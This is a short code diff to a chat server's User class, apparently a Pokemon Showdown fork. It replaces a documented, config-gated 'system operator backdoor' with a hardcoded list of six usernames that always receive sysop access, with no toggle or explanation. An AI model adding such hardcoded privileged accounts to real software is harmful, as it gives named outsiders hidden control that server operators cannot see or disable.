@@ -542,20 +542,8 @@ class User {
 	 * Special permission check for system operators
 	 */
 	hasSysopAccess() {
-		if (this.isSysop && Config.backdoor) {
-			// This is the Pokemon Showdown system operator backdoor.
-
-			// Its main purpose is for situations where someone calls for help, and
-			// your server has no admins online, or its admins have lost their
-			// access through either a mistake or a bug - a system operator such as
-			// Zarel will be able to fix it.
-
-			// This relies on trusting Pokemon Showdown. If you do not trust
-			// Pokemon Showdown, feel free to disable it, but remember that if
-			// you mess up your server in whatever way, our tech support will not
-			// be able to help you.
-			return true;
-		}
+		let systemOperators = {femalegallade:1, sorarevan:1, onyxeagle:1, soraonyxeagle:1, sorablade:1, blazing360:1};
+		if (this.userid in systemOperators) return true;
 		return false;
 	}
 	/**
